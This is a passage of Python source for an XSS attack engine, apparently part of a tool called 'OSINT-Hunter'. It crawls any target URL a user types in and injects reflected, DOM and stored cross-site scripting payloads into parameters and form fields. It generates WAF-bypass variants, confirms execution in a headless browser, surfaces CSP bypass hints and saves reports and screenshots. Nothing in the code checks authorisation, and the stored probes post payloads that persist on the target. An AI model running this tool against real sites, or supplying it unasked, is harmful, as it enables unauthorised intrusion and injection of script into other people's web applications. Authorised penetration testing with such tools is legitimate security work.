    normal_res = session.get(url, timeout=8, verify=False)
    initial_ctx = _get_context(normal_res.text, CANARY)
    payloads_to_use = _select_context_payloads(initial_ctx) if initial_ctx else REFLECTED_PAYLOADS
    tested = set()
    for payload in payloads_to_use:
        for variant in _bypass_variants(payload, waf):
            if variant in tested:
                continue
            tested.add(variant)
            test_url = _inject_param(url, param, variant)
            try:
                res = session.get(test_url, timeout=8, verify=False)
                body = res.text
                ctx = _get_context(body, variant)
                if not ctx:
                    decoded = variant.replace("%3C", "<").replace("%3E", ">").replace("%22", '"').replace("%253C", "<").replace("%253E", ">")
                    ctx = _get_context(body, decoded)
                    if ctx:
                        variant = decoded
                    else:
                        continue
                diff_ok, diff_result = _differential_analysis(session, url, param, variant)
                if not diff_ok and diff_result == "no_change":
                    continue
                browser_executed = False
                screenshot_b64 = None
                if use_browser and HAS_PLAYWRIGHT and ctx in EXPLOITABLE:
                    browser_executed, screenshot_b64 = _browser_verify(test_url, variant, "reflected")
                sc = _score_finding(ctx, variant, body, canary_reflected, waf, res.url, csp_reduction, browser_executed, diff_result)
                st = _status_from_score(sc, browser_executed, "reflected")
                if st == "skip":
                    continue
                finding = {
                    "type": "reflected",
                    "url": test_url,
                    "parameter": param,
                    "payload": variant,
                    "context": ctx,
                    "score": sc,
                    "status": st,
                    "waf": waf,
                    "browser_executed": browser_executed,
                    "differential": diff_result,
                    "csp_reduction": csp_reduction,
                }
                _save_evidence(finding, body, screenshot_b64)
                findings.append(finding)
                _print_live("REFLECTED", st, sc, param=param, url=test_url, ctx=ctx, browser=browser_executed)
                break
            except Exception:
                continue
    return findings


def _test_dom(session, url, page_source, use_browser=True):
    findings = []
    sinks = _detect_dom_sinks_deep(page_source)
    if not sinks:
        return findings
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys())
    for payload in DOM_PAYLOADS:
        if payload.startswith("#"):
            test_url = url.split("#")[0] + payload
        else:
            if params:
                test_url = _inject_param(url, params[0], payload)
            else:
                test_url = url + ("&" if "?" in url else "?") + "x=" + payload
        try:
            res = session.get(test_url, timeout=8, verify=False)
            body = res.text
            ctx = _get_context(body, payload.lstrip("#"))
            browser_executed = False
            screenshot_b64 = None
            if use_browser and HAS_PLAYWRIGHT:
                browser_executed, screenshot_b64 = _browser_verify(test_url, payload, "dom")
            sc = 55 if browser_executed else (45 if ctx else 30)
            st = _status_from_score(sc, browser_executed, "dom")
            if st == "skip":
                continue
            finding = {
                "type": "dom",
                "url": test_url,
                "sinks": [s["sink"] for s in sinks[:5]],
                "sink_details": sinks[:5],
                "payload": payload,
                "context": ctx or "sink_only",
                "score": sc,
                "status": st,
                "browser_executed": browser_executed,
            }
            _save_evidence(finding, body, screenshot_b64)
            findings.append(finding)
            _print_live("DOM", st, sc, sink=", ".join([s["sink"] for s in sinks[:2]]), url=test_url, browser=browser_executed)
            break
        except Exception:
            continue
    return findings


def _test_stored(session, form, waf, csp_reduction, use_browser=True):
    findings = []
    action = form["action"]
    method = form["method"]
    fields = dict(form["fields"])
    source_url = form["source_url"]
    for payload in STORED_PROBE_PAYLOADS:
        probe_fields = {k: payload for k in fields}
        try:
            if method == "post":
                session.post(action, data=probe_fields, timeout=10, verify=False)
            else:
                session.get(action, params=probe_fields, timeout=10, verify=False)
            for check_url in [action, source_url]:
                try:
                    check_res = session.get(check_url, timeout=8, verify=False)
                    body = check_res.text
                    if payload not in body:
                        continue
                    ctx = _get_context(body, payload)
                    browser_executed = False
                    screenshot_b64 = None
                    if use_browser and HAS_PLAYWRIGHT and ctx in EXPLOITABLE:
                        browser_executed, screenshot_b64 = _browser_verify(check_url, payload, "stored")
                    sc = _score_finding(ctx or "raw", payload, body, False, waf, check_url, csp_reduction, browser_executed, "payload_reflected")
                    st = _status_from_score(sc, browser_executed, "stored")
                    if st == "skip":
                        continue
                    finding = {
                        "type": "stored",
                        "url": check_url,
                        "form_action": action,
                        "payload": payload,
                        "context": ctx or "raw",
                        "score": sc,
                        "status": st,
                        "waf": waf,
                        "browser_executed": browser_executed,
                    }
                    _save_evidence(finding, body, screenshot_b64)
                    findings.append(finding)
                    _print_live("STORED", st, sc, url=check_url, ctx=ctx or "raw", browser=browser_executed)
                    return findings
                except Exception:
                    continue
        except Exception:
            continue
    return findings


def _print_live(xss_type, status, score, param=None, url="", ctx=None, sink=None, browser=False):
    color_map = {
        "VERIFIED_EXECUTION": "bold red",
        "VERIFIED_DOM_XSS": "bold red",
        "VERIFIED_STORED_XSS": "bold red",
        "HIGH_CONFIDENCE": "yellow",
        "POSSIBLE_FALSE_POSITIVE": "dim yellow",
        "FILTERED": "dim",
    }
    color = color_map.get(status, "dim")
    browser_tag = " [bold green][BROWSER CONFIRMED][/bold green]" if browser else ""
    score_str = f"score={score}  " if score is not None else ""
    param_str = f"param={param}  " if param else ""
    sink_str = f"sink={sink}  " if sink else ""
    ctx_str = f"ctx={ctx}" if ctx else ""
    console.print(
        f"  [{color}][{xss_type} {status}][/{color}]{browser_tag}  "
        f"{score_str}{param_str}{sink_str}{ctx_str}  "
        f"[link={url}]{url[:80]}[/link]"
    )


def _deduplicate(findings):
    seen = {}
    for f in findings:
        key = (f.get("parameter", f.get("form_action", "")), f.get("context", ""), f["payload"][:40])
        if key not in seen or f["score"] > seen[key]["score"]:
            seen[key] = f
    return sorted(seen.values(), key=lambda x: x["score"], reverse=True)


def _render_terminal(all_findings, dom_findings):
    show = [f for f in all_findings if f["status"] not in ("skip", "FILTERED")]
    if show:
        t = Table(
            title="[bold red]XSS Findings[/bold red]",
            show_header=True,
            header_style="bold red",
            border_style="red",
        )
        t.add_column("Type", width=10)
        t.add_column("Status", width=22)
        t.add_column("Score", justify="right", width=6)
        t.add_column("Browser", justify="center", width=8)
        t.add_column("Param", style="cyan", width=14)
        t.add_column("Context", style="yellow", width=16)
        t.add_column("Payload", style="magenta", width=38)
        t.add_column("URL")
        for f in show:
            st = f["status"]
            if "VERIFIED" in st:
                color = "red"
            elif st == "HIGH_CONFIDENCE":
                color = "yellow"
            else:
                color = "dim"
            browser_icon = "[green]✔[/green]" if f.get("browser_executed") else "[dim]—[/dim]"
            t.add_row(
                f["type"].upper(),
                f"[{color}]{st}[/{color}]",
                f"[{color}]{f['score']}[/{color}]",
                browser_icon,
                f.get("parameter", f.get("form_action", ""))[:14],
                f.get("context", "")[:16],
                f["payload"][:38],
                f["url"][:55],
            )
        console.print(t)
    if dom_findings:
        dt = Table(
            title="[bold cyan]DOM Sink Analysis[/bold cyan]",
            show_header=True,
            header_style="bold cyan",
            border_style="cyan",
        )
        dt.add_column("Status", width=18)
        dt.add_column("Browser", justify="center", width=8)
        dt.add_column("Sinks", style="yellow", width=35)
        dt.add_column("Context", width=14)
        dt.add_column("URL")
        for f in dom_findings:
            browser_icon = "[green]✔[/green]" if f.get("browser_executed") else "[dim]—[/dim]"
            dt.add_row(
                f["status"],
                browser_icon,
                ", ".join(f.get("sinks", [])[:4]),
                f.get("context", ""),
                f["url"][:65],
            )
        console.print(dt)
    clickable = [f for f in all_findings if "VERIFIED" in f.get("status", "") or f.get("status") == "HIGH_CONFIDENCE"]
    if clickable:
        console.print("\n[bold cyan]Clickable URLs — Verified & High Confidence:[/bold cyan]")
        for f in clickable:
            st = f["status"]
            color = "red" if "VERIFIED" in st else "yellow"
            browser_tag = " [green][BROWSER][/green]" if f.get("browser_executed") else ""
            console.print(f"  [{color}]{st}[/{color}]{browser_tag}  [link={f['url']}]{f['url']}[/link]")
        if any(f.get("evidence_screenshot") for f in clickable):
            console.print("\n[bold green]Screenshots saved:[/bold green]")
            for f in clickable:
                if f.get("evidence_screenshot"):
                    console.print(f"  [green]{f['evidence_screenshot']}[/green]")


def _html_report(target, all_findings, dom_findings, waf, csp_info, urls_crawled, params_tested, timestamp):
    verified_exec = [f for f in all_findings if f["status"] == "VERIFIED_EXECUTION"]
    verified_dom = [f for f in all_findings if f["status"] == "VERIFIED_DOM_XSS"]
    verified_stored = [f for f in all_findings if f["status"] == "VERIFIED_STORED_XSS"]
    high = [f for f in all_findings if f["status"] == "HIGH_CONFIDENCE"]
    possible = [f for f in all_findings if f["status"] == "POSSIBLE_FALSE_POSITIVE"]
    browser_confirmed = sum(1 for f in all_findings if f.get("browser_executed"))

    def row(f):
        st = f["status"]
        if "VERIFIED" in st:
            color = "#f85149"
        elif st == "HIGH_CONFIDENCE":
            color = "#d29922"
        else:
            color = "#8b949e"
        param = f.get("parameter", f.get("form_action", ""))
        browser_badge = "<span style='background:#238636;color:white;padding:2px 6px;border-radius:4px;font-size:11px'>BROWSER</span>" if f.get("browser_executed") else ""
        ss_link = f"<a href='{f['evidence_screenshot']}' target='_blank'>[screenshot]</a>" if f.get("evidence_screenshot") else ""
        return (
            f"<tr>"
            f"<td style='color:{color};font-weight:bold'>{f['type'].upper()}</td>"
            f"<td style='color:{color};font-weight:bold'>{st} {browser_badge}</td>"
            f"<td style='color:{color}'>{f['score']}</td>"
            f"<td>{param[:20]}</td>"
            f"<td>{f.get('context','')}</td>"
            f"<td style='font-family:monospace;font-size:11px'>{f['payload'][:60]}</td>"
            f"<td><a href='{f['url']}' target='_blank'>{f['url'][:70]}</a> {ss_link}</td>"
            f"</tr>"
        )

    rows_html = "".join(row(f) for f in all_findings if f["status"] != "skip")
    dom_rows = ""
    for f in dom_findings:
        sinks = ", ".join(f.get("sinks", [])[:5])
        browser_badge = "<span style='background:#238636;color:white;padding:2px 6px;border-radius:4px;font-size:11px'>BROWSER</span>" if f.get("browser_executed") else ""
        dom_rows += (
            f"<tr>"
            f"<td style='color:#58a6ff'>{f['status']} {browser_badge}</td>"
            f"<td>{sinks}</td>"
            f"<td>{f.get('context','')}</td>"
            f"<td><a href='{f['url']}' target='_blank'>{f['url'][:70]}</a></td>"
            f"</tr>"
        )
    csp_html = ""
    if csp_info:
        directives, reduction, hints = csp_info
        if hints:
            csp_html = "<h2>CSP Analysis</h2><ul>" + "".join(f"<li>{h}</li>" for h in hints) + "</ul>"
        if reduction:
            csp_html += f"<p style='color:#d29922'>CSP score reduction applied: -{reduction}</p>"
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>XSS Intelligence Report — {target}</title>
<style>
  body{{font-family:'Segoe UI',sans-serif;background:#0d1117;color:#c9d1d9;padding:28px;margin:0}}
  h1{{color:#f85149;border-bottom:2px solid #30363d;padding-bottom:10px;margin-bottom:6px}}
  h2{{color:#8b949e;font-size:12px;text-transform:uppercase;letter-spacing:1px;margin:28px 0 8px}}
  table{{width:100%;border-collapse:collapse;margin:10px 0 24px;font-size:13px}}
  th{{background:#161b22;color:#58a6ff;padding:10px 12px;text-align:left;border-bottom:1px solid #30363d}}
  td{{padding:9px 12px;border-bottom:1px solid #21262d;vertical-align:top;word-break:break-all}}
  tr:hover{{background:#161b22}}
  a{{color:#58a6ff;text-decoration:none}}
  a:hover{{text-decoration:underline}}
  .stats{{display:flex;gap:14px;margin:20px 0;flex-wrap:wrap}}
  .card{{background:#161b22;padding:16px 22px;border-radius:8px;min-width:110px;text-align:center;border:1px solid #30363d}}
  .num{{font-size:28px;font-weight:bold}}
  .lbl{{font-size:11px;color:#8b949e;margin-top:4px}}
  .meta{{color:#8b949e;font-size:13px;margin-bottom:18px}}
  .footer{{margin-top:40px;color:#484f58;font-size:12px;text-align:center}}
  ul{{color:#c9d1d9;padding-left:20px}}
  li{{margin:4px 0}}
</style>
</head>
<body>
<h1>XSS Intelligence Report</h1>
<p class="meta">Target: <strong style="color:#c9d1d9">{target}</strong> &nbsp;|&nbsp; {timestamp} &nbsp;|&nbsp; WAF: {waf or 'None'} &nbsp;|&nbsp; Playwright: {'Yes' if HAS_PLAYWRIGHT else 'No'}</p>
<div class="stats">
  <div class="card"><div class="num" style="color:#f85149">{len(verified_exec)}</div><div class="lbl">Verified Execution</div></div>
  <div class="card"><div class="num" style="color:#f85149">{len(verified_dom)}</div><div class="lbl">Verified DOM</div></div>
  <div class="card"><div class="num" style="color:#f85149">{len(verified_stored)}</div><div class="lbl">Verified Stored</div></div>
  <div class="card"><div class="num" style="color:#d29922">{len(high)}</div><div class="lbl">High Confidence</div></div>
  <div class="card"><div class="num" style="color:#3fb950">{browser_confirmed}</div><div class="lbl">Browser Confirmed</div></div>
  <div class="card"><div class="num" style="color:#58a6ff">{len(dom_findings)}</div><div class="lbl">DOM Sinks</div></div>
  <div class="card"><div class="num" style="color:#8b949e">{urls_crawled}</div><div class="lbl">URLs Crawled</div></div>
  <div class="card"><div class="num" style="color:#8b949e">{params_tested}</div><div class="lbl">Params Tested</div></div>
</div>
{csp_html}
<h2>Reflected &amp; Stored Findings</h2>
<table>
  <tr><th>Type</th><th>Status</th><th>Score</th><th>Parameter</th><th>Context</th><th>Payload</th><th>URL</th></tr>
  {rows_html or '<tr><td colspan="7" style="color:#8b949e;text-align:center">No findings</td></tr>'}
</table>
<h2>DOM Sink Analysis</h2>
<table>
  <tr><th>Status</th><th>Sinks</th><th>Context</th><th>URL</th></tr>
  {dom_rows or '<tr><td colspan="4" style="color:#8b949e;text-align:center">No DOM sinks detected</td></tr>'}
</table>
<div class="footer">OSINT-Hunter &bull; {datetime.now().year}</div>
</body>
</html>"""


class XSSScanner:
    def __init__(self, base_url, use_browser=True):
        self.base_url = base_url.strip()
        self.session = _make_session()
        self.waf = None
        self.waf_headers = {}
        self.csp_info = None
        self.use_browser = use_browser and HAS_PLAYWRIGHT
        Config.ensure_dirs()
        os.makedirs(EVIDENCE_DIR, exist_ok=True)

    def run(self):
        console.print(Panel(
            f"[bold red]XSS Intelligence Engine[/bold red]\n"
            f"[dim]Browser validation • DOM tracing • CSP analysis • Differential analysis[/dim]\n"
            f"[dim]Target: {self.base_url}[/dim]\n"
            f"[dim]Playwright: {'enabled' if self.use_browser else 'not available — install with: playwright install chromium'}[/dim]",
            border_style="red",
        ))

        console.print("[cyan]→ WAF detection...[/cyan]")
        self.waf, self.waf_headers = _detect_waf(self.session, self.base_url)
        if self.waf:
            console.print(f"[yellow]  ⚠ WAF detected: {self.waf}[/yellow]")
        else:
            console.print("[green]  ✔ No WAF detected[/green]")

        console.print("[cyan]→ CSP analysis...[/cyan]")
        try:
            head_res = self.session.get(self.base_url, timeout=8, verify=False)
            self.csp_info = _parse_csp(dict(head_res.headers))
            directives, csp_reduction, bypass_hints = self.csp_info
            if directives:
                console.print(f"[blue]  CSP found — score reduction: -{csp_reduction}[/blue]")
                for hint in bypass_hints:
                    console.print(f"  [yellow]  → {hint}[/yellow]")
            else:
                console.print("[green]  ✔ No CSP header[/green]")
                csp_reduction = 0
        except Exception:
            csp_reduction = 0
            self.csp_info = None

        console.print("[cyan]→ Attack surface discovery (depth 3, max 100 pages)...[/cyan]")
        crawl = _crawl_sync(self.base_url, max_depth=3, max_pages=100)
        visited       = crawl["visited"]
        forms         = crawl["forms"]
        page_sources  = crawl["page_sources"]
        js_endpoints  = crawl["js_endpoints"]
        spa_routes    = crawl["spa_routes"]
        attack_surface = crawl["attack_surface"]
        login_walls   = crawl["login_walls"]
        sitemap_urls  = crawl.get("sitemap_urls", set())
        robots_urls   = crawl.get("robots_urls", set())

        urls_with_params = [u for u in visited if "?" in u]
        if not urls_with_params and "?" in self.base_url:
            urls_with_params = [self.base_url]

        console.print(
            f"[blue]  {len(visited)} URLs crawled  |  "
            f"{len(urls_with_params)} with params  |  "
            f"{len(forms)} forms  |  "
            f"{len(js_endpoints)} JS endpoints  |  "
            f"{len(spa_routes)} SPA routes  |  "
            f"{len(login_walls)} login walls skipped[/blue]"
        )
        if sitemap_urls:
            console.print(f"[dim]  sitemap: {len(sitemap_urls)} URLs  |  robots.txt: {len(robots_urls)} paths[/dim]")

        if attack_surface:
            at = Table(title="[bold yellow]Attack Surface — High Priority Targets[/bold yellow]", show_header=True, header_style="bold yellow", border_style="yellow")
            at.add_column("Priority", justify="right", width=8)
            at.add_column("Params", style="cyan", width=30)
            at.add_column("JS Sinks", style="red", width=25)
            at.add_column("URL")
            for entry in attack_surface[:10]:
                at.add_row(
                    str(entry["priority"]),
                    ", ".join(entry["params"][:5]) or "—",
                    ", ".join(s.split("\\")[0][:20] for s in entry["sinks"][:3]) or "—",
                    entry["url"][:70],
                )
            console.print(at)

        all_findings = []
        dom_findings = []

        if urls_with_params:
            console.print(f"\n[cyan]→ Reflected XSS — {len(urls_with_params)} URL(s)...[/cyan]\n")
            for url in urls_with_params:
                params = list(parse_qs(urlparse(url).query).keys())
                for param in params:
                    results = _test_reflected(self.session, url, param, self.waf, csp_reduction, self.use_browser)
                    all_findings.extend(results)

        console.print(f"\n[cyan]→ DOM sink analysis — {len(page_sources)} page(s)...[/cyan]\n")
        seen_dom = set()
        for url, source in page_sources.items():
            if url in seen_dom:
                continue
            seen_dom.add(url)
            dom_results = _test_dom(self.session, url, source, self.use_browser)
            dom_findings.extend(dom_results)

        if forms:
            console.print(f"\n[cyan]→ Stored XSS — {len(forms)} form(s) ({sum(1 for f in forms if f.get('form_type') in ('search','content_submission'))} high-priority)...[/cyan]\n")
            for form in sorted(forms, key=lambda x: x.get("priority", 1), reverse=True):
                stored_results = _test_stored(self.session, form, self.waf, csp_reduction, self.use_browser)
                all_findings.extend(stored_results)

        all_findings = _deduplicate(all_findings)
        dom_findings = _deduplicate(dom_findings)

        console.print()
        _render_terminal(all_findings, dom_findings)

        verified = [f for f in all_findings if "VERIFIED" in f.get("status", "")]
        high = [f for f in all_findings if f.get("status") == "HIGH_CONFIDENCE"]
        possible = [f for f in all_findings if f.get("status") == "POSSIBLE_FALSE_POSITIVE"]
        browser_confirmed = sum(1 for f in all_findings if f.get("browser_executed"))

        console.print(Panel(
            f"[red]VERIFIED:[/red] {len(verified)}  "
            f"[yellow]HIGH:[/yellow] {len(high)}  "
            f"[dim]POSSIBLE FP:[/dim] {len(possible)}  "
            f"[cyan]DOM:[/cyan] {len(dom_findings)}  "
            f"[green]BROWSER:[/green] {browser_confirmed}  |  "
            f"[dim]Crawled:[/dim] {len(visited)}  "
            f"[dim]Attack surface:[/dim] {len(attack_surface)}  "
            f"[dim]WAF:[/dim] {self.waf or 'None'}",
            title="[bold]Scan Summary[/bold]",
            border_style="blue",
        ))

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        ts_iso = datetime.now().isoformat()

        json_path = os.path.join(Config.LOG_DIR, f"xss_scan_{timestamp}.json")
        with open(json_path, "w", encoding="utf-8") as fh:
            json.dump({
                "target": self.base_url,
                "scan_time": ts_iso,
                "waf_detected": self.waf,
                "playwright_used": self.use_browser,
                "urls_crawled": len(visited),
                "params_tested": len(urls_with_params),
                "forms_tested": len(forms),
                "summary": {
                    "verified_execution": len([f for f in all_findings if f["status"] == "VERIFIED_EXECUTION"]),
                    "verified_dom": len([f for f in all_findings if f["status"] == "VERIFIED_DOM_XSS"]),
                    "verified_stored": len([f for f in all_findings if f["status"] == "VERIFIED_STORED_XSS"]),
                    "high_confidence": len(high),
                    "possible_fp": len(possible),
                    "dom_sinks": len(dom_findings),
                    "browser_confirmed": browser_confirmed,
                },
                "findings": all_findings,
                "dom_findings": dom_findings,
            }, fh, indent=2)
        console.print(f"[green]✔ JSON: {json_path}[/green]")

        html_path = os.path.join(Config.LOG_DIR, f"xss_report_{timestamp}.html")
        html_content = _html_report(
            self.base_url, all_findings, dom_findings,
            self.waf, self.csp_info,
            len(visited), len(urls_with_params), ts_iso,
        )
        with open(html_path, "w", encoding="utf-8") as fh:
            fh.write(html_content)
        console.print(f"[green]✔ HTML: {html_path}[/green]")

        if os.path.exists(EVIDENCE_DIR) and os.listdir(EVIDENCE_DIR):
            console.print(f"[green]✔ Evidence: {EVIDENCE_DIR}/[/green]")


def run():
    console.print(Panel(
        "[bold red]XSS Intelligence Engine — OSINT-Hunter[/bold red]\n"
        "[dim]Browser-validated • DOM tracing • CSP analysis • Real exploit verification[/dim]",
        border_style="red",
    ))
    url = input("\n  Target URL: ").strip()
    if not url:
        console.print("[red]  URL required.[/red]")
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    use_browser = HAS_PLAYWRIGHT
    if not HAS_PLAYWRIGHT:
        console.print("[yellow]  ⚠ Playwright not installed. Running without browser verification.[/yellow]")
        console.print("[dim]  Install: pip install playwright && playwright install chromium[/dim]")
    XSSScanner(url, use_browser=use_browser).run()


def main():
    run()


if __name__ == "__main__":
    run()
